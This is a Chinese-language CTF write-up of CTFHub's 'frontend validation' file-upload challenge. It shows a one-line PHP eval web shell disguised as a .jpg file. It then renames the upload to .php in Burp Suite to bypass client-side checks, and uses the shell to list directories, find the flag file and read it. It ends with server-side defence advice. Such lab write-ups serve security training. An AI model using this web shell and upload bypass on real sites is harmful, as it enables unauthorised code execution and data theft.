【CTFHub】Web-前端验证 Writeup

操作者：何芊宏 | 操作日期：2026.9.19 | 分类：CTF | 标签：CTFHub, Web, 文件上传, 前端验证, BurpSuite

1. 题目信息

  • 平台：CTFHub
  • 分类：Web - 文件上传 / 前端验证
  • 题目名称：前端验证
  • 提示：利用前端 JavaScript 的局限性，使用 Burp Suite 修改数据包绕过校验

2. 解题思路

本题的核心是利用“前端验证”的脆弱性。前端 JavaScript 代码在用户的浏览器中运行，攻击者对其具有绝对的控制权。通过在本地将木马文件伪装为 shell.jpg，可轻易绕过浏览器端的 JS 后缀检测。随后使用 Burp Suite 拦截请求，将文件后缀名改回 shell.php，从而在服务器端保存并执行恶意代码。

3. 操作步骤

第一步：本地文件制作与伪装

由于之前的木马文件已清理，本次在 VS Code 中新建文件，内容为：

GIF89a
<?php @eval($_POST['cmd']); ?>
  • 保存到 muma 文件夹。
  • 关键点：文件名直接命名为 shell.jpg。这是因为网页前端的 JS 脚本会检查后缀，我们必须用 .jpg 才能让请求发出去。

第二步：前端绕过与 BP 抓包

  1. 开启“前端验证”靶场环境，确保 Burp 处于拦截开启状态（Intercept is on）。
  2. 在 BP 自带浏览器中选中 shell.jpg 并提交，前端未报错（JS 校验通过）。
  3. BP 成功拦截 POST 请求，在请求体中找到：
    Content-Disposition: form-data; name="file"; filename="shell.jpg"
  4. 偷梁换柱：手动将 filename="shell.jpg" 修改为 filename="shell.php"，然后点击 Forward 放行。
  5. 网页提示“上传成功”，文件保存路径为 upload/shell.php。

第三步：Repeater 连马与语法踩坑

将请求发送至 Repeater 标签页，进行标准的连马操作：

  1. 修改第一行为：POST /upload/shell.php HTTP/1.1
  2. 将 Content-Type 改为 application/x-www-form-urlencoded，彻底清空下方所有 ------WebKitFormBoundary... 内容。
  3. 输入命令：cmd=system("ls /");
  4. 修改第3行 Content-Length: 19，确保保留空行，点击 Send。
  5. 手滑踩坑：首次发送时，不小心将命令误写为 cmd=system("ls /0;。服务器返回 Parse error: syntax error, unexpected '0'。这实际上证明了木马已经成功执行（PHP 引擎正在解析我们的代码）。
  6. 修正命令后，成功回显根目录列表。

第四步：搜索并读取 Flag（防坑策略）

  1. 利用 find 命令全盘搜索：cmd=system("find / -name flag* 2>/dev/null");（长度45）。
  2. 成功获取路径：/var/www/html/flag_3216014105.php。
  3. 基于前关经验的防坑：判断沙盒环境可能禁用底层 cat 命令，直接使用 PHP 原生函数读取：
    cmd=print_r(file_get_contents('/var/www/html/flag_3216014105.php'));（长度68）。
  4. 右侧成功回显 Flag：ctfhub{e354135699134bb823d6157a}

4. 踩坑记录与复盘

  • 前端 JS 验证的局限性：前端代码运行在本地，攻击者拥有绝对控制权。不仅可以通过抓包改后缀绕过，甚至可以直接在 F12 开发者工具中修改 JS 逻辑。这证明了安全校验必须依赖于服务端。
  • HTTP 协议的细节与手滑陷阱：在手动拼接 Content-Length 时，必须极其精确，少一个空格或多一个换行都会导致服务器报错。Parse error 报错信息中的“eval()'d code”反而给渗透测试者提供了代码被执行的有效反馈。
  • 沙盒环境下的策略选择：在受限的 Web 沙盒环境中，PHP 原生的文件读取函数（如 print_r(file_get_contents(...))）比底层系统命令（如 cat）具有更高的可用性和稳定性。

5. 知识总结

  • 前端验证绕过：通过修改本地文件后缀（如 shell.php 改为 shell.jpg）欺骗前端 JS。当请求进入 Burp 时，再修改 filename 为 .php 欺骗后端。
  • 攻击链组合：本题融合了文件后缀伪装、MIME 类型修改、Repeater 连马、精确计算 Content-Length 等多个知识点，是对前三关技能的完美综合运用。
  • 安全防御建议：切勿依赖前端进行安全校验。服务端必须严格执行后缀白名单、MIME 校验，并设置上传目录不可执行（如配置 Nginx/Apache 禁止运行上传目录下的脚本），这是防御文件上传漏洞最根本的方案。
